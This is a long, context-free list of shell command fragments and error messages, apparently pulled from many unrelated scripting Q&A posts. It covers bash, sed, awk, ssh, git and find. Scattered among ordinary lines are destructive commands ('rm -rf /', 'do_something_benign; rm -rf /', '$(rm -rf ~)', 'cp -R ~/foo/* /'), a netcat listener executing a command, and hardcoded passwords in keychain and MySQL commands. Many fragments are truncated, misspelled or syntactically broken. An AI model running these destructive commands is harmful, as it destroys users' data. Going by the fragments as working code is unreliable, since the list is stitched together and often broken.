cat data.txt | awk '{print $2}'
chmod +x ./parse.awk
./parse.awk data.txt
" after sbaker-PC"
"before sbaker-PC after"
od -c
Pax Diablo
set -e
set -u
|| break
|| echo "something bad happened"
break 0
man bash
perl -pE 'say "apple" if /^foo/ and not $seen_foo++'
apt-get install
apt-get install foo
apt-get install foo
sudo apt-get install foo
kill -2 <PID of apt-get>
sudo kill -2 $!
sudo foo
; somecommand
pylint blah blah
python -c "exit(4+8+16)"
#!/bin/bash -e
path_to_shell_script/script.sh &
daemon ${basedir}/$prog && success || failure
daemon ${basedir}/$prog
$(( ... ))
grep source typescript
echo "ffmpeg -sameq -i ${1} -ss ${BEG} -t 120 ${before_last_dot}.${COUNTER}.wmv"
ffmpeg -sameq -i ${1} -ss ${BEG} -t 120 ${before_last_dot}.${COUNTER}.wmv
let "MIN-=2"
let: not found
echo $$CURR $$PREV
echo "'$$CURR' '$$PREV'"
else echo X
if [ $$CURR != $$PREV ];
export GIT_WORK_TREE=/var/www/www.example.org
> This is a test /dev/fd/63
> This is a test
> This is a test
> This is a test
sed 's/\.+/_/'
sed 's/\%20/_/'
sed 's/%20/_/'
sed -r
|| exit 1
set -e
set -e
man bash
! command
ABSOLUTE_PATH=$(cd ${possibleDirectory}; pwd)
ABSOLUTE_PATH=$(cd ${possibleDirectory} && pwd)
[js; rename()]
$VAR1_ + $VAR2
man bash
<( )
| cat
$ command &>> logfile
command >> logfile 2>&1
variable worked
shopt -s compat31
export PATH="/usr/local/bin:$PATH
set path = (/usr/local/bin $PATH)
./configure --prefix=/usr/local
/usr/local/bin/ruby source.rb
./configure --prefix=/...
$command &> /some/file
command >> file
"require command here" > log_file_name 2>&1
string="this # string"
string='that # string'
mkdir -pv test/{a,b}
make -e
random =
echo random = $RANDOM
emacs -nw file1 file2
(setq split-height-threshold nil)
(setq split-width-threshold 0)
export ...=.../${PATH}
export PATH
* *
echo "ERROR:somedir" "is" "a" "subdirectory"
foo bar
mount --bind
chmod 755 showfiles
echo $PATH
play -n synth 0 pluck E3
// with a space
time ( commands ... )
export REPORTTIME=3 # display commands with execution time >= 3 seconds
setop xtrace
sed -i
sed -i
sort file -o file
help :g
man ex
-c wq
printf '%s' <string>
echo <string>
dd if=/dev/zero bs=1 count=1 >> file_name
cat file_name | xxd -p
echo $(cat file_name) | xxd -p
cat file_uniquely_named.txt > file_uniquely_named.txt
man bash
"`echo hi`"
'`echo hi`'
`echo hi`
cmd args
' '
" "
' '
" "
echo '$a'
echo "$a"
/path/to/my files/
a b.txt
c d.txt
-c "cd %1%"
bash -i -c "cd %1%; bash"
history -cw
grep -I
grep --binary-files=without-match
grep -v
C-x C-e
EDITOR=emacs -nw
complete -p
man bash
stty -a -F /dev/ttyS0
min = 1; time = 0
stty -F /dev/ttyS0 min 0 time 10
man stty
2 testDir
rm -rf \*filter\*
rm -rf '*filter*'
-c command
printf "%s\n" "${!foo[@]}"
printf "%s\n" "${foo[@]}"
paste <(cmd1) <(cmd2)
man bash
printf " "
time=$(./a.out 3>&1 1>/dev/null 2>&3)
kill -2 $arecodr_pid
# Recording now finished, get user input
kill -<signal num> $arecord_pid
grep -n
nameserver 127.0.0.1
nameserver 127.0.0.1
awk '/^nameserver/ && !modif { printf("INSERT\n"); modif=1 } {print}'
a mynewtext
perl -lne 'if (not $f and /^nameserver/){ print "nameserver 127.0.0.1"; $f=1 }; print' resolv.conf
Administrators/Creator Group/Creator Owner/system
setfacl -r -m default:other:rwx
wc -l
cargo install count_occurences
"<tr>                                  <td nowrap valign="top"/paragraph"
sed -i 's/old/$new/g' file
sed -i "s/old/$new/g" file
# Configuration foo - Start
# Configuration foo - Start
basename $1
$(basename $1)
SOMEVAR=${2:-$(basename "$1")}
<td nowrap valign="top" and insert in the line above
grep -P "tr>\s*\n\s*<td"
shopt -s nocasematch
MYVAR1=1 \
MYVAR1=1 \
-bash: 34:ln=01: command not found
unset LS_COLORS
ssh [...]
set name=value;
AcceptEnv: *
variable = ....
echo 'overflow' | sed -e "s/over/"OVER"/g"
bar=echo $foo|tr '.' ' '
echo $bar
echo ${TOOLS[@]} -222222
grep -q "not found"
grep -q
if <a newline> ; then
if $(printf "\n"); then echo Y; else echo N; fi
< <(list)
bash < <(...)
bash < /dev/fd/100
diff <( some_command ) <( some_other_command )
set -e
set -e
ENV1 != "Prod"
exec > >(tee ${MBL}) 2>&1
exec > >()
:se list
echo !! >> logfile.txt
read $line
i=( $line1 )
j=( $line2 )
mailx -s ${i[2]} -t ${i[1]} -r ${i[0]} < ${i[3]}
head -n 4
tr>$ <td nowrap valign
sed -i '/^<ul>$/ d/6' file
perl -p -i -e "s/^<perl-regex-here>$\n//g" <filename>
man edit
man builtin
man bash
awk '{print $2}'
zcat large_file.gz | echo $("awk '{system("echo -e '"'"'"$1"\t"$2"'"'"' | gzip >> "$1".gz");}'")
&& echo
set -o monitor
set -m
sleep 60
sleep 60
<li><p><a href="anti\/recent.html">
<li><p><a href="anti\/recent.html">
<li><p><a href="anti\/recent.html">
<li><p><a href="anti\/recent.html">
<li><p><a href="anti\/recent.html">
php myfile.php -- argument1 argument2
M-x shell
M-x term
M-x shell
C-l C-l
ls: cannot access <dir>/*/: No such file or directory
mv -i
| mybash.sh
mutt -f mytmpmail
mytmpmail | msmtp address@example.com
mutt -s "subject" -a mytmpmail adress@ex.com
term screen-256color
export TERM=xterm-256color
./configure --enable-colors256
#define COLORS256 1
term screen-256color
git clone https://git.savannah.gnu.org/git/screen.git
sudo apt-get install libpam0g-dev
make install
find $path -type d
find . -type d
-n 1
rlwrap ./your-script
man zshall
sed -e "/fox/ {" -e "r $file" -e "d" -e "}" -i "$targetFile"
./myscript A B C D
C D
less -X
set +m
shopt -u huponexit
disown [-ar] [-h] [jobspec ...]
... | xargs gzip -d | xmlstarlet ...
compose 'gzip -d' 'xmlstarlet ...'
wget http://foo.xml.gz | gzip -d | xmlstartlet > $(basenname foo.xml.gz .gz).new
-n 1
printf "%s\n" "get -r *" "quit" | sftp -b - "$USER@$HOST"
man file
array=( "$(split '|' "$string")" )
split ()
ffmpeg -i concat:"$(ls|tr '\n' '|')" -acodec copy out.mp3
mutt -e "set content_type=text/html" Email -s "subject" -a pic.png  < test.html
unfunction my_function
git commit -m "$*"
echo $PATH
npx ftp-srv ftp://0.0.0.0:2121 --root .
--root .
bash -c
; \
127.0.0.1 localhost cygdrive wpad
find /home/ -name 'myfile' -type f -printf '%h\n'
"This will not expand \$hello"
'This will not expand $hello'
./script 'blah$blah'
awk '{ if ( $2 <= 3 ) print $10; }' mpstat-log.txt
less -S
less --chop-long-lines
cut -c 1-80
cut -c 1-
sed -n '100000,125000p' input
sed -n '100000,125000p; 125001q' input
echo $?
git status
git -c color.status=always status
status=$(script -q /dev/null git status | cat)
tail -f
stat -c %i "$1"
echo "restarting tail"
man hostname
head -1
Hostname -I
127.0.0.2 143.127.52.130 2a00:dee0:ed3:83:245:70:fc12:d196
Hostnmae -I
(?<=inet addr:)
(?=  Bcast)
ipconfig getifaddr [interface]
cat ./script.sh | bash
bash ./script.sh
while IFS= read line
while IFS=; read line
name=value command
sentence="hello" echo $sentence
sentence="hello"; echo $sentence
man bash
sentence="hello" echo $sentence
sentence=HI env | fgrep sentence
rpc:call(Node, M, F, A)
s M F
blank spaces/tabs before and after the $pattern
blank spaces/tabs just before the $pattern
blank spaces/tabs just before the $pattern
blank spaces/tabs just before the #whatever and after #pattern
# menu - foo
[ \t]pattern[ \t]
[ \t]pattern.[^ \t]
[ \t]pattern#[^ \t]
[ \t]#[^ \t].pattern[ \t]
[ \t]#[^ \t]#pattern[ \t]
ls | grep
rm -I
strings /bin/rm | grep -q 'GNU coreutils' 
screen -ls
echo $f
rm -r $f
awk '{print $1,$2,$3}'
wc -c
pat="new Array('#6a7072', '#723e29', '#2d7371'"
set keymap vi-insert
cat file_with_long_content | less
while true; do date; done
sh inf.sh | less
sh inf.sh | less
:set ff=unix
perl -p -e 's/^/"/' myfile
awk '$1 < NUMBER { print }' FILENAME | sort -n
| sort -n
help test
man bash
2> /dev/null
The\ App.app
php myScript.php
OLD_TEXT == '\'
NEW_TEXT == '/'
OLD_TEXT == '\\'
NEW_TEXT == '\/'
awk '!/[\\]/' file > temp && mv temp file
awk '!/[/]/' file > temp && mv temp file
export NUKE=<path>
os.system('$NUKE -x scriptPath')
import os
set -- "${@:1:i-1}" "${@:i+1}"
_takeNrandom_out+=( "${!i}" )
egrep -o "DELIM.*" input
find / -name "hello.txt" -exec echo {} \;
grep 'mykey' /your/file/here | sed -r 's/.*mykey = (^[ ]*) .*/\1/g'  | grep .
mykey =
echo $var
kill -SEGV <PID>
mvn clean install
mvn clean install
mvn clean install
find development/js -name "*.js"
ls -l
ls -l
/store/01 -name "*.fits" -exec chmod -x+r {} \;
. -type f
set -x
bash --version
((var++)) || true
cp -- q file
cp -- q 'file\' 'with\' spaces
kill %1
cat file
$( )
printf "## %5s %5s %5s ##\n## %5s %5s %5s ##\n" '' '*' '' '' "•" ''
>##           *       ##
>##         •       ##
>##           *       ##
>##           •       ##
fprintf "## %5s %5s %5s ##\n## %5s %5s %5s ##\n" '' '*' '' '' '•' ''
rm -rf /
do_something_benign; rm -rf /
 mkdir -p $EXTRACTDIR/$CV_NAME*/release 
cd $EXTRACTDIR/$CV_NAME*; mkdir release
echo $var
echo 2
var=2; echo $var
$1 &
/usr/bin/find $findme_path -iname '"*.gpx"' -print0 '|' xargs -0 $other_command"
"$@" &
dosomething /usr/bin/find $findme_path -iname "*.gpx" -print0
Fred's file.txt
find_and_do_something /whatevers/in/findme_path
'sed -f script infile'
-E or --extended-regexp
-G or --basic-regexp
-P or --perl-regexp
man 7 regex
perldoc perlre
grep cron
ps -ef;
grep cron;
ps -ef;
grep [c]ron;
grep [c]ron
ps -ef | grep word
uuencode -m whatever.sh whatever.sh >tmp
dateRecent='2011 年\r\n 7 月 25 日'
source ./parser.sh
echo -e
while read
man bash
top -b -n1
top -b -n 1
top -b 999
echo $PATH
echo $PATH
ls -la
$ echo 'this 1 2 3' | grep '[0-9]\+'
bash -x
sudo -u user2 /home/user2/bin/test.sh
cat someFile.log | grep someIP | more
uname -m
uname -m
ant debug; echo %errorlevel%
if errorlevel <prev_value>  adb install ...
rename -V
-f foo -a -d foo
[ -f foo ] && [ -d foo ]
declare -f
set -a
export -f showxx
. a.bash
./myscript.sh foo
./myscript.sh bar
system("ls", ARGV[0])
require 'shellwords'
a b
a b
make clean
find . -regex '.*\.php' -o -regex '.*\.phtml'
xargs: svn: No such file or directory
>> ~/temp
xargs -a
which svn
foo.sh: line 23: asdfas: command not found
#do something
find -name 'reg' | xargs ...
false && true
set -e
set -e
set -e
set -e
set -e
|| true
false && true
set -e
true && false
set -e
set -e
PS4='$(echo $(date) $(history 1) >> /tmp/trace.txt) TRACE: '
Wed Aug 3 12:47:27 PDT 2011 6672 ping www.google.com
$(git branch 2> /dev/null | grep -e "\* " | sed "s/^..\(.*\)/ {\1}/")
history 1
trap 'a oneliner in here' DEBUG
$(date +"%Y/%m/%d (%H:%M)")
$(history 1 |cut -c 7-)
cut -c 7-
>> /tmp/trace
( ... )
fgrep -f
while ... echo ... done | tail -n 1
tail -n 1
tail -n 1
|tee output
without altering line endings
man 1 test
man test
for loop
for s in string
< yourfile.txt
echo -e "$s1\n$s2" | sed -f script
perl -e '$a{$_}++ for split "",shift;  $b{$_}++ for split "",shift;  for (sort keys %a){print if defined $b{$_}}' my_foo not_my_bar
Unable to verify signatures in PPA.  Check that this is fixed: NO_PUBKEY <PGPkeyID>
NO_PUBKEY <PGPkeyID>
grep -o "NO_PUBKEY <.*>" | sed -e 's/.*<\(.*\)>.*/\1/'
compgen -v STR
fv() { env | grep "^$1"; }
grep -v
nl -nln
'<data file>'
'<data file>'
'<data file>'
sed -n -f script
sed -n -f script
" 503
grep '" 503 ' access.log
bash -c ...
>= 0.5 && $3 <= 0.1
vim h<TAB>
(my-long-running-process &)
-f "$1"
-d "$1"
-f argumentlist
test PS1='\e[0;30mtest \e[0m'
echo foo
test PS1='\e[0;3echo foo
echo foo
echo foo
$cat foo.sh
$ cat foo.sh  | sort | uniq
uniq -u
$ cat foo.sh  | sort | uniq -u
uniq -d
$ cat foo.sh  | sort | uniq -d
find . ! -user pieter -o ! -group www-data -a -print0
set -vx
echo %
$(rm -rf ~)
-d $'\n'
tr '\n' '\0' <a.txt | xargs -0 ...
| sh
...| xargs -r0 -I{} bash -c 'f="{}"; command "$f";' ''
bash -c
git all pull
" "
ls *" "*
ls *\ *
man echo
if [ -z ... ]
man bash
export ddd
ls -l
man find
ls -l
find * -type f -printf '%p\t%s\t%TY-%Tm-%Td %Tk:%TM\n'
find * ...
sed 's/^\.\///'
find -newermt
man find -newerXY
date -d
find -newermt
touch -d
find /dir -newer
$user: path [git:branch +?]
ls -tr $FROM_DIRECTORY
set -x
set -x
tail -f output.txt
set -x
string1="atest  toast"; string2="test test"
grep: unescaped ^ or $ not supported with -Pz
tr \\0 x
lsb_release -r
s#...#...#g' doesn't work, try
set -vx
ls *.tar.gz | while read line; do tar -xzvf "${line}"; done
ls *.tar.gz | ...
ls -1
monthly backup.tar.gz
tar xzf monthly backup.tar.gz
echo | xargs tar
while read
read -r
perl my.pl
perl my.pl a.txt
STDIN=$(cat -)
read -r
env POSIXLY_CORRECT=1 echo "$line"
cat file.cpp | tx
tx < file.cpp
tx file.cpp
printf '$text'
#echo $EXBRANDS
#dir1 dir2 dir3 (it appears exactly like this)
#read var
printf "$EXBRANDS" | grep "^$var\$"
a b
echo $X
sh -c 'cmd' _ arg1 arg2 ...
echo -e
date +%s
1 -m ,
1 a.txt
0  and a.txt
{ stuff...; }
echo 'cpio'
read -u6
for loop | grep
Stuff I want
-f 2
sudo bash -vx script.sh
find . -type f
xargs -d "\n"
perl -pi -e 's/search/replace/g'
"fi ;;"
expect "assword:"
telnet 10.1.1.1
grep -E
grep -P
cd d:/work_space_for_....
echo cd d:/some/path >> ~/.bashrc
cd d:/some/path
Start in
:ConqueTermSplit bash
$(~/.rvm/bin/rvm-prompt g)
if else
cat <<'^I!'
:set list
od -xcb
100.000;8438;  06:46:12
echo ${args[0]} ${args[1]} ${args[2]}
"$(pgrep firefox)"
$(pgrep firefox)
kill -SIGTERM
echo "$(pidof /usr/local/bin/p4d)"
if [ -z "$(pidof /usr/local/bin/p4d)" ]; then
if [ -z "$p4dPid" ]; then
p4dPid="$(pidof /usr/local/bin/p4d)"
echo $p4dPid
#!/bin/sh -e
#!/bin/sh -e
paste -d "\t" file1 file2 > file3
setlocal EnableDelayedExpansion
set /p
RANDOM % X
switch case
case ... esac
#!/bin/bash -e
set -e
man xargs
< <(command)
for file in $(find ...)
find ... -print0 | xargs -0
\""  "\"
* .*
man find
apt-get -fy update | grep -q 'fill in restart message pattern' && reboot
line = , expect_out(buffer) = (buffer)
new value
-ne Hello World
"unzip ../prepped-zip-file-$buildNum.zip"
"unzip ../prepped-zip-file-11.6.zip: Command not found.
ssh -v $server1
zsh 4.3.17
C-x *
Esc Space
Esc !
Esc .
EXCLUDE=' --exclude /bin/a* '
ksh -x tartest.ksh
sed -i_bak -e '/domain\.com/d' /etc/hosts
sed -i_bak -e '/domain\.com/d' /etc/hosts
sed -i_bak -e '/\<namourphoto\.com\.br\>/d' ~/Desktop/hosts
basename filename.foo.bar .foo.bar
flock -n
set -e
exit 0
0 5
"0 5"
export FIGNORE="$FIGNORE:DS_Store"
$(( expr ))
$[ expr ]
man bash
meta name
povray ... &
pm.max_children = 50
pm.max_children = 5
s/^\(pm.max_children = \).*/\15/
bash for i in {1..10}
do echo $i
-q -c
$ tar xfO some.jar META-INF/MANIFEST.MF
echo "abc"{1..3}
echo "abc"{1..3}"\n"
dmidecode > dmidecode.txt
'{print $NF}'
grep "Product Name"
cut -f2 -d ":"
while read
[[ $string =~ $re ]]
VBoxManage list runningvms|awk -F \{ '{gsub("\"",""); print $1}'
-u param
-h param
./script -v -a -b -f filename
-a -b -c
yourfile.sh -last "Adios" -first "Hola"
if [[ -n ${variables[$argument_label]} ]]
if [[ -n $argument_label ]] ; then
while getops "n:" arg: do
while getops "n:o:p:" arg: do
o) Option=$OPTARG
p) Parameter=$OPTARG
$ bash -c "help declare"
$ bash -c "help shift"
some_cmd with parameters
screen -c your-file
touch next_file; for f in ordered_list_of_files; do cat $f >> next_file; rm $f; done
dd ... | tee local_file | sha1sum
bbe - binary block editor
set -o braceexpand
sudo -s
return #
bash: #: Bad file descriptor
exec #>/dev/null
exec ...
echo >&FD
nc -l 8088 -c``echo 'Request got, let's produce it'
exit 0
ssh -t -t
Pseudo-terminal will not be allocated because stdin is not a terminal.
man ssh
ssh -t
ssh -t -t
tcgetattr: Inappropriate ioctl for device
bash 4.2.8(1)-release
[[ expression ]]
0xC2 0xA0
svn --help
svn co
cd wherever
ls **/*.xml
rm **/*.xml
-d char
grep -v '^[[:space:]]*$'
for X in {18..2500} ;
-A NUM, --after-context=NUM
single quotes
double quotes
single quotes
double quotes
if(found) print
awk '/TERMINATE/ {y=1;next} y'
awk '/TERMINATE/ ? c++ : c'
perl -ne 'print unless 1 .. /TERMINATE/'
echo $EXPORT_FLT_2
echo $1
sh -x export.sh "$EXPORT_FLT_2"
audacious -p
audacious2 -p "song 1" "song 2"
find -type f
read -r
tr '\012' '\000'
xargs -0
script.pl input.txt > output.txt
date | 
date | while ...
echo | return
f(){ echo|return; }
[[ ]]
cat ~/.bash_history
print $0
print $0
print $0
cut -c 1-16
cut -c 1-16 file
cut -c3-
cut -d':' -f5
cut -d';' -f2,10
cut -d' ' -f3-7
history --help
X=$(expr $X + 1 )
(("$X" < "20"))
[ $X -lt 20 ]
let X=X+1
let X++
(( expr ))
let X++
set -vx
tput sc
tput rc
ps -A | grep fsdameon
ps -a | grep fsdaemon
ps | grep
ps | grep
cat /dev/stdin
ssh -t -t
ssh -tt
Pseudo-terminal will not be allocated because stdin is not a terminal
Pseudo-terminal will not be allocated because stdin is not a terminal.
ssh -T user@server <<EOT ...
ssh user@server /bin/bash <<EOT ...
ssh ...
echo "$REL_DIR"
ssh -t user@server "$heredoc"
Pseudo-terminal will not be allocated because stdin is not a terminal
ssh user@server
ssh jdoe@server '...'
ssh jdoe@server ' ... '
ssh jdoe@server <<'EOF' # Do NOT do this ... EOF
ssh -t jdoe@server 'read -p "Enter something: "; echo "Entered: [$REPLY]"'
ssh jdoe@server 'echo out; echo err >&2'      # OK - stdout and stderr separate
ssh -t jdoe@server 'echo out; echo err >&2'   # !! stdout + stderr -> stdout
Pseudo-terminal will not be allocated because stdin is not a terminal.
ssh -t -t ...
ssh -tt ...
ssh -tt jdoe@server <<<'read -p "Enter something: "; echo "Entered: [$REPLY]"'
getconf ARG_MAX
mkdir -p $target
set -o vi
:syntax enable
#!/bin/bash -x
[ "$3" -lt 480 ]
480: No such file or directory
[ "$3" -lt 480 ]
[ "$3" \< 480 ]
[[ $3 < 480 ]]
(( $3 < 480 ))
(( var < 480 ))
for i in *.png; do img2pdf  "$i" --out "${i%.*}.pdf";done
a=(1 2 3)
ssh -C
gzip -9
lzma -9
ssh -C
ls -la
echo 321 | sed -e 's/\([[:digit:]]\)/.\1/g' | cut -b2-
echo  32 | sed -e 's/\([[:digit:]]\)/.\1/g' | cut -b2-
which module
module load vnc;vncserver :8080 -localhost
command not found
module load whatever
/bin/echo 123 | /bin/echo
some-command | cat
head -n 2000 file1.log
su - USERNAME -c '/path/to/script'
MY_PATH=$(readlink -f $YOUR_ARG)
$(cd SOME_DIRECTORY 2> /dev/null && pwd -P)
readlink -f <relative-path>
realpath some path
realpath "some path"
elif [ -e hcm.war ]
elif .. fi
else ; if ... fi
elif ... fi
mkfifo localpipe;
mkfifo remotepipe;
 cat localpipe | ssh -q einstein "cat > remotepipe"
echo "input;"  > localpipe
echo ... > pipe
exec 3>&-
date -I
while true; do <bulk of script>; sleep 1; clear;
tail -f <file>
rsync -Pa source destination
watch -n 5 du -s
-X stuff
if something ; then ...
shell interpreter
space after [ and before ]
if [ 1 = 1 ]
runjar hi there
java -jar myjar.jar hi there
runjar one two three
java -jar myjar.jar one two three
ssh_disc myhost
ssh -O stop myhost
unset -f
sh -c
alias sd='sudo '
alias install='sd apt-get install'
sd='sudo '
man nohup
man nohup
man screen
unzip file.zip
unzip -
cat file.zip | sh unzip_scan.py -
inet addr:
pstree -s $$
pstree -p $$
head file | od -c
dos2unix filename filename
EOFError: EOF when reading a line
ValueError: I/O operation on closed file
ssh user@host 'command; another; more'
ssh user@host "sh -c 'command; another; more'"
info bash
mv "${mrk_source#.marker}" /output/out
set -x
git diff
git diff
sort -k2
find -newer tmpfile
diff -R
find $dir -mtime
svn log -rPREV:HEAD -v
sort -f
uniq -i -d -D
./name_of_script name_of_scriptlog
while .....; do ....; done
until ......; do ......; done
exit 1
type pwd
builtin pwd
$(which pwd)
[ -f "$2/$fn" ]
man bash
man test
uname -r
uname -v
info expr
tail -f <file>
tail -f <file> | grep pattern
tail -f <file> | grep <pattern>
tail -f /var/log/some.log |grep foo
tail -n0 -f <file> | sed -n '/search string/p'
tail --pid=$(($BASHPID+1)) -n0 -f <file> | sed -n '/search string/{p; q}'
-c +0
ctrl + c
shift + f
colortail -n 30
tail -f
tail -F
tail -f /var/log/syslog
journalctl -xf
man page
while (<>)
man sh
ls -la
system("rm "$10)
system("rm Queue.swift")
system("cp "$12" .")
system("cp ../../../Platform/DataStructures/Queue.swift .")
git status .
find .
-type l
-exec sed -i '' {} \;
sed -i '' PATH
VAR_NAME=VAR_VALUE COMMAND
set -f
man zsh
cd /var/www/domain.com/httpdocs
dos2unix --help
intern = TRUE
intern = TRUE
bundle exec
stat -f "%m" folder
ls -l folder
stat -f "%m" folder
date -r folder
find foo bar baz -printf
stat -f "%m"
stat -f "%m"
sort -n -r
head -1
grep a | grep b
mv '.' '.'
echo $SHELL
man bash
cat *.mp3 > merged.mp3
-maxdepth 0
tail -f
grep -q
tail -f
tail -f
tail -f
tail -f
tail -n 300 qqq | grep -q return
tail -n 300 -f qqq | grep -q return
tail -n 300 -f qqq | strace -o grep.strace -q return
tail -f
tail -n 300 -f qqq | grep -q return
pgrep bash
wc -l
pgrep bash
info bash
man bash
set -o vi
set editing-mode
set keymap
TAB: ...
set wildmode=longest:full:list,full
ps | grep
ps ax | grep
ls -t|head -n 1
unset -f
sh -c
sprintf("%02d", file)
filename = sprintf("%s_%02d.pdb", pdb, file);
'@', '.', '_'
{ '@'->'!40", '_'->'!5F', '.'-> '!2E' }
env FOO='test1234 R -vanilla < script.R
system("echo $FOO
system("echo $FOO")
set -o vi
'MDP_44' => 'sdDSD4343khjkjhkjhjk',
shopt -s extglob
cat |
rmdir -rf
here documents
3<<'__INIT__' ... '__INIT__'
find . -name "*.en.php"
find . -name "*.fr.php"
find . -name "*.(en|fr).php"
find . -not -path Config -name "*.fr.php"
-not -path Config
history -a
shopt -s histappend
$1 == "ATOM" && ($5==c[0] || $5==c[1]...) {print $0}
mymove "/home/me/downloads/my new file.zip"
fgrep '2064351200' example.log | fgrep 'action: example'
sed s/stringA/stringB/g
ping google.com
$JAVACMD -jar LatencyCounter.jar LatencyCounter.xml $DATE $HR
cd $CURDIR
a=`expr 1 + 2`
-o plusdirs
/foo/bar * baka/waka xoxotinh(|).mp3
"asd * sdd||ss.mp3"
Rarr="file_1", "file_2", "file_3"
IFS="" ,""
Rarr="${arr[*]}";echo "${Rarr}"
Rarr="\"file_1\" \"file_2\" \"file_3\""
wineserver -f -d | grep init_thread(
wine <program>
wine start program
wine <program>
wine start <program>
wine start \wait <program>
wineserver --wait
wineserver --wait
grep "lang" * -R | perl -n -e 'while(/(\w*lang\((.*)\)\w*)/g) {print $1."\n"}'
$ java -server  -XX:OnOutOfMemoryError="./oom_script %p"  TestOOMClass
echo ${cmd}
set -xv
set -xv
set +xv
set -xv
'(' -name CVS -or -name build -or -name classes -prune ')'
-mtime +10
shell_exec('echo '.$variable)
$ ~ ' " \n \r \c `` ( ) { } ; \
set -o pipefail
date -I
man date
date -I
date +%F
date -I
sed 's/<\/sProblemDesc>/'"anew test"'&/' create.xml
<sProblemDesc>anew test</sProblemDesc>
./script.sh "enter stuff here" "enter more stuff" "21313122131"
sed 's/<\/sProblemDesc>/'"$variablename"'&/' create.xml
./script "variablename here" "etc etc" "etc"
echo sed 's/<\/sActionDesc>/'"$variablename"'&/' create.xml
sed s/<\/sActionDesc>/&/ create.xml
echo $line | cut -d" " -f7 | bc -l
help hash
./test_3g.sh | cat -A
for i in ./2011/*
remind -mc
--EX "ABCDEFG"
^--EX\ \".*\"$
make -n
comm -12 src txt
join src txt
ssh user@machine mkdir -p a/b/c/d/e/f
chmod -r
chmod a+x a; chmod a+x a/b; chmod a+x a/b/c; ...
umask 066
printf "%b\n" "\x5A"
read sN1 char
complete -EC "echo ' '"
bash --version
man bash
echo -e
not found
not found
not found
find /home/devel/stuff/static/ -iname "*.txt"
gcc -o myread myread.c -lreadline
svn log
svn commit
svn propget --rev-prop -r $REV svn:log
set -e
set -e
do shell script
do script
do shell script
package ...;
java -jar ...
git config alias.*
git config github.token xxx
alias git=hub
brew install hub
chmod o-w /
#!/usr/local/bin/bash -x
PAXDEBUG=1 myscript.sh
bash -x
set -x
set +x
[[ -n backtic ... ]];
; do
gcc -shared
Elf32_Half      e_type
Elf64_Half e_type
" "
shopt -s nullglob
$(echo abc | md5sum | cut -f 1 -d " " | cut -c 1-4)
cut -c 1-4
complete -F _myfoo
complete -C myfoo
sharedRepository = group
chgrp -R target-group .
find . -type d | xargs chmod g+ws
find refs -type f | xargs chmod g+w
export HISTIGNORE="&:[bf]g:exit:mc:htop:top:clear:reset:histoty *:df *:du *:kill *:pkill *:pushd *:popd:bash *:yaourt *:pacman *:upd"
export HISTIGNORE=""
sudo timeout 5 tcpdump -ieth1 -w ~/dump.bin
pkill myprogram
cat search.txt
done < <(find ...)
touch 'foo bar' && stat 'foo bar'
while read
for file in $(find ...)
find . -name "*.exe" -print0
man ftp
quote, put, quit
man netrc
-k 6
find /ftpdir/Site1/ -type f -mtime +90 -delete
find /ftpdir/Site1/ -type d -empty -mtime +90 -delete
ls --color=always
ls --color=always
read -r
printf '%s\n'
< <(printf '%s\n' "$(cat input)")
while read
for f in /var/files;do echo $f;done;
hexdump output.txt
__git_ps1: command not found
git --version
git branch
128 + signal-number
do script
key code
osascript myscript.scpt
git branch -r seesaw
git rebase --abort
git rebase --abort
git rebase --abort
grep -Fxvf
unset PATH
man bash
help time
find $loc -name "*.bsp"
while read
while read
initiate ()
bzip ()
initiate ()
bzipint ()
initiate ()
initiate ()
initiate ()
initiate ()
initiate ()
find $loc -name "*.bsp" | while read
while read
< file
ksh 93u+
zsh 5.0.5
bash 4.2+
read data
svn st
cut -c 10-
sed 's/.\s\+//'
-F ':'
sh script.sh
' Yes
stat -c%s fill_me
Command Substitution
read line
unbuffer cmd1 | watcher
cmd1 | unbuffer watcher
./program1 | { ./watcher.sh ; printf "\n" ; }
sudo apt-get install sloccount
less /path/to/repo/.git/config
touch /path/to/repo/.git/config
ssh-copy-id -i /path/to/passwordless/id.pub cron-user@server.example.com
eval $(ssh-agent); ssh-add /path/to/passwordless/id;
read -r
read -r
printf '%s\n' "input"
man export
sh -c
help export
Associative Array
declare -A
. something.properties
java -version
openjdk 11.0.6 2020-01-14 LTS
java -version
java -version 2>&1 | head -1 | cut -d'"' -f2 | sed '/^1\./s///' | cut -d'.' -f1
version=$(java -version 2>&1 | sed -n ';s/.* version "\(.*\)\.\(.*\)\..*"/\1\2/p;' | awk '{ print $1 }')
130 2020-01-14
awk '{ print $1 }'
|| true
set -e
find . -print0 '*.gz' -exec cp '{}' '/home/itadmin/temp4{}' \;
-type f
echo 'There are 5 apples and 7 oranges' | egrep -o '[0-9]+ \w+'
find . -name "*.VER" -mtime -31 -exec mv '{}' /opt/html/31';' -print
find . -name "*.VER" -mtime -31 -mtime -62 -exec mv '{}' /opt/html/62 ';' -print
cp -R ~/foo/* /
security unlock-keychain -p "12345678" "CAC-4070-4443-223E-5555-2187"
PROMPT_COMMAND="history -a;$PROMPT_COMMAND"
PROMPT_COMMAND="history -w;$PROMPT_COMMAND"
history -a;history -c; history -r
history -a
history -w
history -a
history -w
history -a
history -w
history -n
shopt -s histappend
export HISTCONTROL=erasedups
freeswitch.log 2011-09-08T12:21:07.282236
-k 2,2
grep -v
grep -F -vf ...
case in
| more
echo | more | $r
-k 1.1,1.1
-k 1.1,1.1
substring 'this is my test string' 1,-1
is is my test stri
echo 'this is my test string' | awk '{ print substr( $0, 2, length($0)-2 ) }'
~/.bashrc file
shift 2
$3 -> $1, $4 -> $2, ...
local foo="barfoo"
getopts <options> var
getent passwd $SUDO_USER | cut -d: -f6
git submodule foreach
git rev-parse --show-toplevel
git status --ignore-submodules=none
git status
git status
while read
git rev-parse --git-dir
while ... read
while ... read
$ myprogram 2>&1 | ftee /tmp/mylog
$ gcc ftee.c -o ftee
$ ping www.google.com | ftee /tmp/mylog
$ cat /tmp/mylog
$ cat /tmp/mylog
-O -
"read -e"
"read -e"
"read -i"
-S "> "
bash scriptname.sh
Command Not found
Command Not Found
bash -x scriptname.sh
\r\n (CR+LF)
\n (LF)
set -x
bash -x
ls -l
chmod +x testscript.sh
Cannot execute command
chmod u+x testscript.sh
cd /opt/script
cd "$(dirname "$0")"
HERE=$(dirname $0)
pwd -P
man 3 realpath
vim /user/loca/shell/sh
Database exist
result=$(mysqlshow --user=root --password=12345 dbname | grep -v Wildcard | grep -ow dbname)
chmod 600
$DBNAME = $DBEXISTS
$DBEXISTS = ""
while ... done
eval $cmd </dev/tty
vim quickedit/MyClass.java
print $2
git describe
git tag -l
echo "$i"
pv -s
